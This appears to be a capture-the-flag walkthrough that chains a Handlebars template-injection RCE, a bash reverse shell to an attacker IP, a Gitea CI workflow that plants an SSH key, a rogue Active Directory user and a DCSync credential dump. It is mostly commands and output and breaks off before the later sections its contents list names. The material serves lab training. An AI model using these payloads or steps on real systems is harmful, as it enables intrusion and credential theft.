
<img src="Images/logo%20darkzeroreturns.png" width="275" alt="logo darkzeroreturns">


# Attack Chain


# Summary

- [Enumeration](#enumeration)
- [Web](#web)
	- [Register account](#register-account)
	- [Character Creation](#character-creation)
	- [SSTI Attempt](#ssti-attempt)
	- [RCE - CVE-2026-33937](#rce---cve-2026-33937)
	- [Reverse shell](#reverse-shell)
- [Josh's compromise](#joshs-compromise)
- [Internal Network](#internal-network)
	- [Ligolo setup](#ligolo-setup)
	- [Scan internal targets](#scan-internal-targets)
- [Gitea](#gitea)
	- [Generate KRB5 file](#generate-krb5-file)
	- [Request a service ticket](#request-a-service-ticket)
	- [Connect over SSPI](#connect-over-sspi)
	- [CVE-2026-22555](#cve-2026-22555---fork-the-repository-inside-the-organization) & [CVE-2026-58424](#cve-2026-58424---bypass-pull-request-approval)
- [Bloodhound](#bloodhound)
- [Privilege Escalation - SRV01](#privilege-escalation---srv01)
	- [Create root user in OU GiteaMigration](#create-root-user-in-ou-giteamigration)
	- [Shell as root on SRV01](#shell-as-root-on-srv01)
- [PIllaging SRV01](#pillaging-srv01)
- [DCSync DC02.darkzero.ext](#dcsync-dc02darkzeroext)
- [Enum trusts](#enum-trusts)
- [Compromised darkzero.htb](#compromised-darkzerohtb)
	- [Craft Golden Ticket](#craft-golden-ticket)
	- [Hives retrieval](#hives-retrieval)
	- [DCSync DC01.darkzero.htb](#dcsync-dc01darkzerohtb)
	- [Shell as administrator on DC01](#shell-as-administrator-on-dc01)

---
# Enumeration

```
nmap -sVC 10.129.39.77 -oA nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
echo '10.129.39.77 dzcampaigns.htb' | tee -a /etc/hosts
```

# Web


![website darkzeroreturns](Images/website%20darkzeroreturns.png)

DnD game

### Register account

![register account DarkZeroReturns](Images/register%20account%20DarkZeroReturns.png)

Register account

`a@a.com` : `P@ssword123`

### Character Creation

![create characters darkzeroreturns](Images/create%20characters%20darkzeroreturns.png)

![characters creation form](Images/characters%20creation%20form.png)

The default campaign message indicate template. 
Node.js is used (cookie dz.sid match the default structure used by node.js).

### SSTI Attempt

Let's attempt to inject a payload in some fields

Tis one works
```
{{#with "test"}}{{this}}{{/with}}
```

![injection valid darkzeroreturns](Images/injection%20valid%20darkzeroreturns.png)

Handlebars **[CVE-2026-33937](https://github.com/EQSTLab/CVE-2026-33937)**


### RCE - CVE-2026-33937

Changing the body type in the Burpsuite request to JSON reveal that it accepts json too, which is something really important to exploit that CVE.

With that, we can craft the following request and click on **Send**.

```
POST /character HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 722
Origin: http://dzcampaigns.htb
Connection: keep-alive
Referer: http://dzcampaigns.htb/character/new
Cookie: dz.sid=s%3AUfFHhrC9-k2J3NORlTPVNUl-7JUPC4lE.J5iJyIATakwH16uJybvd9RcIIoTTH%2Fpa65jEv7z55MY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{"_csrf":"69b962a57a4bb39d4ed616ff980d521b18db6e8efb5c42f30f14c21c3de53b32","name":"test","race":"test","class":"test","backstory":"test","campaign_id":1,"campaign_message":{"type":"Program","strip":{},"loc":null,"body":[{"type":"MustacheStatement","escaped":true,"loc":null,"strip":{"open":false,"close":false},"path":{"type":"PathExpression","data":false,"depth":0,"parts":["lookup"],"original":"lookup","loc":null},"params":[{"type":"PathExpression","data":false,"depth":0,"parts":[],"original":"this","loc":null},{"type":"NumberLiteral","value":"1)) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','id']).toString() //","original":1,"loc":null}]}]}}
```

![rce valid darkzeroreturns](Images/rce%20valid%20darkzeroreturns.png)

### Reverse shell 

Encode our payload to base64.

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.254/6767 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNTQvNjc2NyAwPiYxJwo=
```

Then send our request through Burpsuite.

```
POST /character HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 722
Origin: http://dzcampaigns.htb
Connection: keep-alive
Referer: http://dzcampaigns.htb/character/new
Cookie: dz.sid=s%3AUfFHhrC9-k2J3NORlTPVNUl-7JUPC4lE.J5iJyIATakwH16uJybvd9RcIIoTTH%2Fpa65jEv7z55MY
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{"_csrf":"69b962a57a4bb39d4ed616ff980d521b18db6e8efb5c42f30f14c21c3de53b32","name":"test","race":"test","class":"test","backstory":"test","campaign_id":1,"campaign_message":{"type":"Program","strip":{},"loc":null,"body":[{"type":"MustacheStatement","escaped":true,"loc":null,"strip":{"open":false,"close":false},"path":{"type":"PathExpression","data":false,"depth":0,"parts":["lookup"],"original":"lookup","loc":null},"params":[{"type":"PathExpression","data":false,"depth":0,"parts":[],"original":"this","loc":null},{"type":"NumberLiteral","value":"1)) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNTQvNjc2NyAwPiYxJw== | base64 -d | bash']).toString() //","original":1,"loc":null}]}]}}
```

We should receive a reverse shell quickly after.

```
penelope -i tun0 -p 6767 -U
[+] Listening for reverse shells on 10.10.*.*:6767
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SRV01 10.129.*.* Linux-x86_64 👤 darkzero(996) • Assigned SessionID <1>
[+] Interacting with session [1] • Shell Type Raw • Menu key Ctrl-C ⇐
[+] Logging to /root/.penelope/sessions/SRV01~10.129.*.*-Linux-x86_64/2026_07_26-17_32_13-559.log
───────────────────────────────────────────────────────────────────────────────────
darkzero@SRV01:~$ id
id
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
```

# Josh's compromise

```
darkzero@SRV01:~$ ls -la
ls -la
total 88
drwxrwxr-x   6 darkzero darkzero  4096 Jul 26 22:31 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero  1358 Jul 26 22:31 .bash_history
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src
```

```
darkzero@SRV01:~$ cat .env
cat .env
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```


```
darkzero@SRV01:~$ mysql -u darkzero -p
mysql -u darkzero -p
Enter password: C4ntFindMyDMpass!
```

```
mysql> use darkzero_campaigns
mysql> show tables;
show tables;
+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
7 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | a@a.com               | hacked   | $2b$10$6NzGUias9fjZ54TW/p/gyeGsBdR83zG2MvDL67PX1elde3FBbgXuK | player | 2026-07-26 21:09:07 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
3 rows in set (0.00 sec)
```


```
$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK:Rangers1
```

> [!TIP]
> **Josh's credentials obtained**
> `josh` : `Rangers1`

```
ssh josh@10.129.39.77
josh@10.129.39.77's password: Rangers1

josh@SRV01:~$
```


# Internal Network

```
josh@SRV01:~$ id
uid=780601110(josh) gid=780600513(domain users) groups=780600513(domain users),780601111(repoaudit)
```

Group managed by the domain

```
josh@SRV01:~$ realm list
darkzero.ext
  type: kerberos
  realm-name: DARKZERO.EXT
  domain-name: darkzero.ext
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U
  login-policy: allow-any-login
```

The domain is `darkzero.ext`

```
josh@SRV01:/tmp$ cat /etc/resolv.conf
nameserver 172.16.20.2
search darkzero.ext
```

There is also an internal network.

```
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.3  netmask 255.255.255.0  broadcast 172.16.20.255
        ether 00:15:5d:f4:7c:02  txqueuelen 1000  (Ethernet)
        RX packets 22718  bytes 2846743 (2.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26429  bytes 7395253 (7.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


### Ligolo setup

```
./ligolo_proxy -selfcert
```

```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```

```
scp agent_amd64 josh@10.129.39.77:/home/josh
```

```
josh@SRV01:~$ nohup ./agent -connect 10.10.16.254:11601 -ignore-cert > /dev/null 2>&1 &
```


```
ip route add 172.16.20.0/24 dev ligolo
```

```
fping -asgq 172.16.20.0/24
172.16.20.2
172.16.20.1
172.16.20.3
```

### Scan internal targets

```
nmap -iL hosts -sVC -oA internal_scan
Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-26 18:24 CEST
Nmap scan report for 172.16.20.1
Host is up (0.051s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-26 23:24:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Not valid before: 2026-05-21T21:36:38
|_Not valid after:  2106-05-21T21:36:38
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Not valid before: 2026-05-21T21:36:38
|_Not valid after:  2106-05-21T21:36:38
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Not valid before: 2026-05-21T21:36:38
|_Not valid after:  2106-05-21T21:36:38
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.darkzero.htb, DNS:darkzero.htb, DNS:darkzero
| Not valid before: 2026-05-21T21:36:38
|_Not valid after:  2106-05-21T21:36:38
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00155df47c00 (Microsoft)
|_clock-skew: 6h59m59s
| smb2-time:
|   date: 2026-07-26T23:26:02
|_  start_date: N/A

Nmap scan report for 172.16.20.2
Host is up (0.037s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-26 23:24:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.ext0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Not valid before: 2026-05-21T21:43:06
|_Not valid after:  2106-05-21T21:43:06
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.ext0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Not valid before: 2026-05-21T21:43:06
|_Not valid after:  2106-05-21T21:43:06
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7f6311ce988fd321; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=XUSVe2lwOUE3L82x78VgMVxL8iA6MTc4NTEwODI2OTA2OTU3MTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 26 Jul 2026 23:24:29 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLmRhcmt6ZXJvLmV4dDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vZ2l0ZWEuZGFya3plcm8uZXh0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOi
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=502c33fe9b398263; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=jwU9qBe6cBUKWt5bpVqACc3TOXc6MTc4NTEwODI3NDk4NTM0OTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 26 Jul 2026 23:24:34 GMT
|_    Content-Length: 0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.ext0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Not valid before: 2026-05-21T21:43:06
|_Not valid after:  2106-05-21T21:43:06
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.ext0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC02.darkzero.ext, DNS:darkzero.ext, DNS:darkzero-ext
| Not valid before: 2026-05-21T21:43:06
|_Not valid after:  2106-05-21T21:43:06
```

```
echo '172.16.20.1 DC01 DC01.darkzero.htb darkzero.htb' | tee -a /etc/hosts && echo '172.16.20.2 DC02 DC02.darkzero.ext darkzero.ext' | tee -a /etc/hosts
```


# Gitea

REFAIRE CHAINE POST WRITEUP

![login failed gitea darkzeroreturns](Images/login%20failed%20gitea%20darkzeroreturns.png)
Can login with SSPI though (like SSO).

### Generate KRB5 file

```
nxc smb 172.16.20.2 --generate-krb5-file /etc/krb5.conf
```


### Request a service ticket

Request a service ticket for `josh`.

```
kinit josh@DARKZERO.EXT
Password for josh@DARKZERO.EXT:Rangers1
```

```
klist                  
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
07/27/2026 16:10:58  07/28/2026 02:10:58  krbtgt/DARKZERO.EXT@DARKZERO.EXT
	renew until 07/28/2026 16:10:54
```

### Connect over SSPI

```
curl -s --negotiate -u : -b cookies.txt -c cookies.txt "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1"
```

```
klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
07/27/2026 16:10:58  07/28/2026 02:10:58  krbtgt/DARKZERO.EXT@DARKZERO.EXT
	renew until 07/28/2026 16:10:54
07/27/2026 16:11:28  07/28/2026 02:10:58  HTTP/gitea.darkzero.ext@DARKZERO.EXT
	renew until 07/28/2026 16:10:54
```

Then we change the values of the cookies inside the browser to the one inside the file `cookies.txt` to access the gitea instance.


![login success gitea darkzero returns](Images/login%20success%20gitea%20darkzero%20returns.png)We succesfuly logged in

Gitea version is **1.25**



There is a CI workflow that triggers when doing push or pull request on the repo.
The workflow `main.yml` execute the command `npm ci` which execute the commandin the repo

![main.yml gitea darkzeroreturns](Images/main.yml%20gitea%20darkzeroreturns.png)

![workflow fails gitea darkzeroreturns](Images/workflow%20fails%20gitea%20darkzeroreturns.png)
https://github.com/advisories/GHSA-fhx7-m96w-mv29

### CVE-2026-22555 - Fork the repository inside the organization

Since we are not admin on the current repo, we need to fork it to the current organization so we gain admin rights.

This allows a **read-only** organization member, in a team with `can_create_org_repo=false`,  to create repositories in the organization namespace via the API. 
The attacker receives full admin permissions on the forked repository, can enable Actions, push arbitrary workflow files, and exfiltrate all organization-level CI/CD secrets (deploy keys, cloud credentials, API tokens) through the runner infrastructure.

Fork the repository

```
curl -s --negotiate -u : -b cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"organization":"DarkZero","name":"evil-fork"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -m json.tool
```


Enable actions

```
curl -s --negotiate -u : -b cookies.txt \
  -X PATCH -H "Content-Type: application/json" \
  -d '{"has_actions":true}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/evil-fork"
```


Pushed to `evil-fork` (branch `main`). It triggers **only** on review/comment events (so it does not create a blocked `pull_request` run), and drops our SSH key into `svc-runner`'s `authorized_keys`:

**pwn.yml**
```
# .gitea/workflows/pwn.yml
name: pwn
on:
  pull_request_review_comment:
  pull_request_review:
  pull_request_comment:
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: x
        run: |
          install -d -m 700 /home/svc-runner/.ssh 2>/dev/null
          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDxjHtTZf+1gOZkEVWf/y7JQsaELIsOOa86Z1qcQzgp/Cw9znV4M53znWMxqgSKTSDv8GQoS9taJgX5Xz7iph0ny+synFTDab6rEyALkIM/0xsGW2dkWiXw2js7hDJ+cv35Bn/aZ8E0QgLZl/U2z5aZwxZrtCHTUMFS1XLtMo0QRAZQ9KwivpuVoXek7FbHq8H1abQfJ3wQrEpbUmaZBefsXh8bUlC75VJYR/+d8CrJE5baaufEI7n0EWFyBVfbapUHQ9dyZYpYbmlzvYsDRfPeyGo+VLpJ4E6lu8Cfm9CIHFxVixi9v251ZE+5cNHuf1g+ipgivKryQhKpnGkI0ix0Iya/KllwjYH5BuYFp5fR4ImuZCC3HyLkv0F4kfi/9swRa8bLCj8SYInWYbFMModaN97DppHbzIOG8Aw7khcd82pvuCYqO8msDp5Bb1iCgp+/2hWrPKDjNcz2Xo5ykghbVtZPqfV3/g2FOiZc+ItpAg9Jlej+1GBZ2o04kezGpYQq9qGzZ5HVYLXcmUEG0Ic0VU5W47sH2DPP+3pmwByUGASNy0xMZTyYKq3MioQj/81RR11s0/5VClrKizvUoMfuQ1r7QbmniIV1LtdXu7Tq7la4mrE6t/15+uoAfBo51Rjn2wKBbHit2cvBdXtnPHPC30DojGWxJgI0IevCnhJRVw== root@exegol-htb' >> /home/svc-runner/.ssh/authorized_keys 2>/dev/null
          chmod 600 /home/svc-runner/.ssh/authorized_keys 2>/dev/null
```

```
B64=$(base64 -w0 pwn.yml)
curl -s --negotiate -u : -b cookies.txt -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$B64\",\"message\":\"ci tweak\",\"branch\":\"main\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/evil-fork/contents/.gitea%2Fworkflows%2Fpwn.yml"
```


Then we perform a Pull request.

```
curl -s --negotiate -u : -b cookies.txt -X POST -H "Content-Type: application/json" \
  -d '{"title":"ci","body":"x","head":"DarkZero:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls" \
  | python3 -m json.tool
```

### CVE-2026-58424 - Bypass Pull Request Approval

We notice the following though.

![approval needed darkzeroreturns](Images/approval%20needed%20darkzeroreturns.png)

But we need approval. Since we added the line `pull_request_review_comment`, we can bypass the approval by writing a comment to our own Pull Request (**CVE-2026-58424**).

For a review event, the Gitea notifier does not attach the PR (`input.PullRequest == nil`), so `IsForkPullRequest` remains `false`, and consequently the `ifNeedApproval` gate never applies.

We need to post a **review** (event `COMMENT`) on our own Pull Request, pointed at the fork HEAD commit:

```
curl -s --negotiate -u : -b cookies.txt -X POST -H "Content-Type: application/json" \
  -d '{"body":"looks good","event":"COMMENT","commit_id":"<FORK_HEAD_SHA>"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/<PR_NUMBER>/reviews"
```

We should now be able to connect over ssh as `svc-runner`.

### Shell as svc-runner

```
ssh -i id_rsa svc-runner@10.129.39.184

svc-runner@SRV01:~$ 
```

# Bloodhound

Collect data for bloodhound with `josh`'s credentials.

```
bloodhound.py --zip -c All -d "darkzero.ext" -u "josh" -p 'Rangers1' -ns "172.16.20.2"
```


# Privilege Escalation - SRV01

We can access keytab file, we can retrieve it on our box with `scp`.

```
scp -i id_rsa svc-runner@10.129.39.184:/etc/gitea-runner/svc-runner.keytab svc-runner.keytab
```

Then we use it to gain a TGT

```
kinit -kt svc-runner.keytab svc-runner@DARKZERO.EXT
```

```
klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
07/27/2026 18:38:53  07/28/2026 04:38:53  krbtgt/DARKZERO.EXT@DARKZERO.EXT
	renew until 07/28/2026 18:38:52
```


```
bloodyAD -H DC02.darkzero.ext -d darkzero.ext -u svc-runner -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=darkzero,DC=ext
permission: CREATE_CHILD
```

We have CREATE_CHILD permission on the OU `GiteaMigration`, which doesn't contain anything.

Maybe we can create an user root inside that OU and try to connect on the target with that user so it will thing we are the root user. Let's try that theory

### Create root user in OU GiteaMigration

```
bloodyAD -H DC02.darkzero.ext -d darkzero.ext -u svc-runner -k add user 'root' 'Password123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'  

[+] root created
```

And we enable it

```
bloodyAD -H DC02.darkzero.ext -d darkzero.ext -u svc-runner -k set object 'root' userAccountControl -v 512

[+] root's userAccountControl has been updated
```

### Shell as root on SRV01

We can now request a ticket for the creater root user.

```
svc-runner@SRV01:/etc/gitea-runner$ kinit root@DARKZERO.EXT 
Password for root@DARKZERO.EXT:Password123!
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

And then authenticate over Kerberos to gain a shell as `root`.

```
svc-runner@SRV01:/etc/gitea-runner$ ksu root

Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root@SRV01:/etc/gitea-runner# id
uid=0(root) gid=0(root) groups=0(root)
```

And we indeed have uid=0 which means we have root privileges.

# PIllaging SRV01

Under the `/root` we find the file `darkzero_campaigns_backup.sql`.

Looking inside, we find the following :

```
1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES 2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES 3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

We know we can't crack admin's password so let's try with the other two hashes.

Let's try to crack them with `hashcat`. 

```
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC:babygurl13
```

> [!TIP]
> **Credentials obtained**
> `celia` : `babygurl13`


```
nxc smb 172.16.20.2 -u 'celia' -p 'babygurl13'
SMB         172.16.20.2     445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\celia:babygurl13 (admin)
```

# DCSync DC02.darkzero.ext

`celia` has `DCSync` right over the domain which means we can dump every hashes of the domain `darkzero.ext`.

![celia dcsync darkzeroreturns](Images/celia%20dcsync%20darkzeroreturns.png)

```
secretsdump.py  "darkzero.ext"/"celia":"babygurl13"@"DC02.DARKZERO.EXT"
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x1e2387a6da831b290b28e59556ae89d2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2bdd03aa4dc9ff2c4f19860e380618:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkzero-ext\DC02$:aes256-cts-hmac-sha1-96:d8cb694e2212d22714da90f476f85f2cbe62911affa83cbced7140df21a2461c
darkzero-ext\DC02$:aes128-cts-hmac-sha1-96:08addbe85bcedc597c61e413509bb858
darkzero-ext\DC02$:des-cbc-md5:0786d92658a258df
